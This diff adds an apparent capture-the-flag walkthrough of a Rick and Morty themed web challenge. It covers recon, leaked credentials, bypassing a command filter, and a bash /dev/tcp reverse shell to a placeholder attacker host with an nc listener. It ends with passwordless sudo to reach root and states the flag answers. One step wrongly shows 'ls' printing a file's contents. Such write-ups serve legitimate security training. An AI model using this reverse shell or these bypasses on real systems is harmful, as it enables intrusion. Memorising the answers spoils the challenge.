@@ -1,0 +1,86 @@
+This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.
+
+I started with a scan of the IP using a custom script that runs nmap and dirsearch.
+
+Nmap showed that there were 2 ports open.
+    22 SSH
+    80 HTTP
+    
+Dirsearch showed multiple pages. We will start with robots.txt. 
+
+Navigating to the IP address in a browser shows a username when you 'view source'
+    Username found on main page - R1ckRul3s
+
+When you navigate to that page the test 'Wubbalubbadubdub' is on the page. A possible password?
+
+Next we'll try to navigate to the portal.php page. This page has a login.
+
+I entered the username and password we found! It worked!
+
+It appears we can enter commands on this page.
+
+I tried 'ls'. It printed out a bunch of file names.
+    Sup3rS3cretPickl3Ingred.txt
+    assets
+    clue.txt
+    denied.php
+    index.html
+    login.php
+    portal.php
+    robots.txt
+
+I tried to read the file with 'cat Sup3rS3cretPickl3Ingred.txt'
+
+It is a restricted command. 
+    "Command disabled to make it hard for future PICKLEEEE RICCCKKKK."
+    
+Try it with 'less Sup3rS3cretPickl3Ingred.txt'
+
+That worked! This is our first ingredient.
+    "mr. meeseek hair"
+
+Let's create a reverse shell.
+
+First we need to open up a terminal and start a listener:
+    nc -nlvp 1234
+        listening on [any] 1234 ...
+
+Now we enter our shell command:
+    bash -c 'bash -i >& /dev/tcp/ATTACKBOX_IP/PORT 0>&1'
+        connect to [10.6.1.204] from (UNKNOWN) [10.10.226.235] 54104
+        bash: cannot set terminal process group (1355): Inappropriate ioctl for device
+        bash: no job control in this shell
+        www-data@ip-10-10-226-235:/var/www/html$
+        
+We have a shell.
+
+I checked for sudo privileges with 'sudo -l'
+
+We can execute sudo commands without a password.
+
+Next type sudo ls ../../../* to list all directories and files.
+
+There is a file called 3rd.txt in the ../../../root directory.
+
+Enter 'sudo ls ../../../root/3rd.txt'
+    3rd ingredients: fleeb juice
+    
+That's our 3rd ingredient.
+
+After some poking around in the directories in navigated to /home/rick/.
+
+'ls' to list contents of the directory and there's a file called 'second ingredients'.
+
+Type less 'second ingredients'
+    1 jerry tear
+    
+Our final ingredient!
+
+
+
+
+
+
+
+
+
